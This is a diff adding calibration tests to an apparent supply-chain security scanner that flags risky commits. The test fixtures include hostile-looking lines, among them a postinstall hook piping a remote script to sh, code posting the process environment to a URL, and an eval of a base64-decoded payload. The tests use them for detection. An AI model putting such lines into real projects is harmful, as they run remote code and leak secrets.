@@ -1059,3 +1059,119 @@ def test_a_commit_that_landed_through_a_pr_was_not_a_direct_push():
 def test_unknown_arrival_does_not_fire():
     # Unknown must never be read as "established newcomer".
     assert "context.new_maintainer_direct_push" not in _ids(_newcomer(author_arrival_days=None))
+
+
+# ============================================================== calibration round 2
+# Each case below is a line or file that raised a false alert on the first holdout hunt
+# (triage/calibration/round2). That hunt became calibration the moment it was tuned on.
+
+
+@pytest.mark.parametrize("line", [
+    '  "version": "13.7.0",',       # DeLaGuardo/setup-clojure: a release bump
+    '    "node": ">=20"',            # dkamm/pr-quiz: an engines constraint
+    'version = "1.1.0"',            # apisec-inc/AI-Surface: pyproject.toml
+])
+def test_a_version_valued_setting_is_not_a_dependency(line):
+    path = "pyproject.toml" if "=" in line and ":" not in line else "package.json"
+    assert "content.dependency_added" not in _scan_ids([_file(path, _added(line))])
+
+
+EVENT_STREAM_HUNK = """@@ -9,6 +9,7 @@
+   },
+   "dependencies": {
+     "duplexer": "^0.1.1",
++    "flatmap-stream": "^0.1.0",
+     "from": "^0.1.7",
+     "map-stream": "0.0.7",
+     "pause-stream": "^0.0.11","""
+
+
+def test_a_package_added_inside_a_dependency_section_still_counts():
+    findings = rules.scan(_change([_file("package.json", EVENT_STREAM_HUNK)]))
+    dep = next(f for f in findings if f.rule_id == "content.dependency_added")
+    assert dep.evidence == "flatmap-stream" and dep.line == 12
+
+
+def test_a_version_shaped_entry_in_another_section_is_not_a_dependency():
+    hunk = '@@ -1,3 +1,4 @@\n   "engines": {\n+    "pnpm": ">=8",\n+    "bun": "1.0"\n   },'
+    assert "content.dependency_added" not in _scan_ids([_file("package.json", hunk)])
+
+
+def test_bumping_an_existing_dependency_is_not_adding_one():
+    hunk = '@@ -5,3 +5,3 @@\n   "dependencies": {\n-    "zod": "^3.0.0"\n+    "zod": "^3.25.0"\n   }'
+    assert "content.dependency_added" not in _scan_ids([_file("package.json", hunk)])
+
+
+def test_many_added_dependencies_are_one_finding():
+    lines = ['  "dependencies": {'] + [f'    "pkg{i}": "^1.0.{i}",' for i in range(30)]
+    findings = rules.scan(_change([_file("package.json", _added(*lines))]))
+    deps = [f for f in findings if f.rule_id == "content.dependency_added"]
+    assert len(deps) == 1 and deps[0].evidence.startswith("pkg0, pkg1")
+
+
+@pytest.mark.parametrize("line", [
+    "env=dict(os.environ),",                                # AI-Surface tests: subprocess env
+    "spawn(cmd, args, { env: process.env })",
+    "subprocess.run(cmd, env={**os.environ, 'X': '1'})",
+])
+def test_passing_the_environment_to_a_child_process_is_not_collection(line):
+    assert "content.secret_access" not in _scan_ids([_file("tests/t.py", _added(line))])
+
+
+@pytest.mark.parametrize("line", [
+    "requests.post(URL, json=dict(os.environ))",
+    "fetch(u, {body: JSON.stringify(process.env)})",
+])
+def test_sending_the_environment_somewhere_is_still_collection(line):
+    assert "content.secret_access" in _scan_ids([_file("src/a.py", _added(line))])
+
+
+def test_vendored_source_is_reported_once_and_not_scanned():
+    # anonyco/FastestSmallestTextEncoderDecoder committed a test node_modules tree; its
+    # yargs and es-abstract files scored 40.
+    files = [_file(f"test/node_modules/x/f{i}.js", _added("require('child_process').execSync(c)",
+                                                          "eval(code)"), change_type="added")
+             for i in range(20)]
+    files.append(_file("test/node_modules/x/package.json",
+                       _added('{"scripts": {"postinstall": "curl https://x.io | sh"}}'),
+                       change_type="added"))
+    files.append(_file("test/node_modules/x/data.weird", change_type="added", is_binary=True))
+    findings = rules.scan(_change(files))
+    assert _ids(findings) == {"context.vendored_code"}
+    assert not rules.should_escalate(findings)
+
+
+def test_an_opaque_binary_in_a_vendored_path_still_escalates():
+    findings = rules.scan(_change([_file("vendor/x/payload.node", change_type="added",
+                                         is_binary=True)]))
+    assert rules.should_escalate(findings)
+
+
+def test_an_unreadable_diff_is_reported_as_unscanned_not_as_clean():
+    unread = FileDiff(path="dist/index.js", change_type="modified", is_binary=False,
+                      additions=13690, patch_omitted=True)
+    findings = rules.scan(_change([unread]))
+    assert "context.diff_unavailable" in _ids(findings)
+    assert not rules.should_escalate(findings)
+
+
+def test_a_rebuilt_bundle_is_judged_on_what_is_new_to_it():
+    # A regenerated dist/ moves every line; what its dependencies always contained is
+    # not news. A payload that was not there before is.
+    old = "const cp = require('child_process');\nfetch(url);\n"
+    rebuilt = FileDiff(path="dist/index.js", change_type="modified", is_binary=False,
+                       patch=_added("const cp = require('child_process');", "fetch(url);"),
+                       baseline=old)
+    assert not rules.should_escalate(rules.scan(_change([rebuilt])))
+
+    injected = FileDiff(path="dist/index.js", change_type="modified", is_binary=False,
+                        patch=_added("const cp = require('child_process');", f"eval(atob('{B64}'))"),
+                        baseline=old)
+    findings = rules.scan(_change([injected]))
+    assert {"content.encoded_blob", "content.decode_call"} <= _ids(findings)
+    assert rules.should_escalate(findings)
+
+
+def test_without_a_baseline_every_hit_counts_as_before():
+    plain = _file("dist/index.js", _added("require('child_process')"))
+    assert _sev(rules.scan(_change([plain])), "content.shell_exec") == "high"
